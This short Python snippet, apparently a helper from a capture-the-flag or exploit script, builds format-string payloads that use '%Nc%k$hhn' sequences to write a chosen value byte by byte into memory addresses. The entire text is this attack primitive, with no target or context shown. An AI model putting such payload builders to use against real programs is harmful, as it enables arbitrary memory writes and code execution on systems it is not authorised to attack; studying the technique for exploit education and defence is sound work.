passed = 0

def write_addr(addr, value, tot, index):
    global passed
    addr_ls = [addr, addr + 1, addr + 2, addr + 3, addr + 4, addr + 5]
    value_ls = [value & 0xff, (value >> 8) & 0xff, (value >> 16) & 0xff,
                (value >> 24) & 0xff, (value >> 32) & 0xff, (value >> 40) & 0xff]
    payload = ''
    passed &= 0xff
    for i in range(tot):
        now = (value_ls[i] - passed + 0x100) & 0xff
        if now == 0:
            now = 0x100
        payload += '%{}c%{}$hhn'.format(now, index + i)
        passed = value_ls[i]
    return payload
